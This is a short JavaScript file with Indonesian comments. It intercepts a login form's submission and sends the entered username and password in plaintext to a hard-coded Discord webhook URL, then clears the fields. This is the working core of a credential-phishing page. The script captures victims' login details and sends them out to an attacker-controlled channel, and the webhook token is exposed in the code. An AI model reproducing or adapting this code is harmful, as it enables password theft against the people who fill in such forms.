document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Menghentikan pengiriman formulir default

    // Mendapatkan nilai input username dan password
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    // Membuat objek payload yang akan dikirim ke webhook Discord
    var payload = {
        content: "Username: " + username + "\nPassword: " + password
    };

    // Mengirim data ke webhook Discord menggunakan metode POST
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1123832965848371210/62Un1VxngmBrMqaXfBQtucnO3HYPeZpWA-2OgHJtODUAnCilPWEHrBa3fetm1j5vP4ZL", true);
    request.setRequestHeader("Content-Type", "application/json");
    request.onreadystatechange = function() {
        if (request.readyState === XMLHttpRequest.DONE && request.status === 200) {
            console.log("Data terkirim ke webhook Discord.");
        } else {
            console.error("Gagal mengirim data ke webhook Discord. Status: " + request.status);
        }
    };
    request.send(JSON.stringify(payload));

    // Mengosongkan input setelah pengiriman data
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
});
